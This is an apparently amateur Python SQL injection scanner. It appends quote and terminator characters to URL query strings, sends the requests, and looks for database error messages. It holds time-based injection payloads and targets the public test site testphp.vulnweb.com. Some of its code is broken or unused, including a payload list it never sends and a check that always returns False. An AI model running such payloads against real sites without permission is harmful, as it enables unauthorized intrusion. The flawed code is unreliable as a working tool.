from urllib.parse import urlparse
import re
import requests
from bs4 import BeautifulSoup as bs
import Blinder


class sql:
    payloads = ["' AND 1=2", '#', "' or sleep(5)#", str("));waitfor delay '0:0:5'--")]
    value_terminators = ["'", ";", "%00"]

    def __init__(self, url):
        self.url = url

    def identify_url(self):
        url_scheme = urlparse(self.url)
        print(url_scheme)
        return url_scheme

    def fuzz_url(self, url_scheme):
        if url_scheme.query != "":
            for term in sql.value_terminators:
                link = url_scheme.scheme + "://" + url_scheme.netloc + "/" \
                       + url_scheme.path + "?" + url_scheme.query + term
                content = bs(requests.get(link).content, "html.parser")
                print(is_vulnerable(content, self.url))


def is_vulnerable(response, url):
    errors = [
        # MySQL
        "you have an error in your sql syntax;",
        "Warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    ]

    for error in errors:
        if len(response.body.find_all(text=re.compile(error))) > 0:
            print("There is vulnerability (SQLİ)")
            print("Error {}".format(error))
        else:
            continue

    blindCheck = Blinder.blinder(url, sleep=2)
    print("Blind SQL Injection Bulundu : {}".format(blindCheck.check_injection()) + "//// " + url)

    return False


if __name__ == '__main__':
    sqlscanner = sql("http://testphp.vulnweb.com/artists.php?artist=1")
    sqlscanner.fuzz_url(sqlscanner.identify_url())
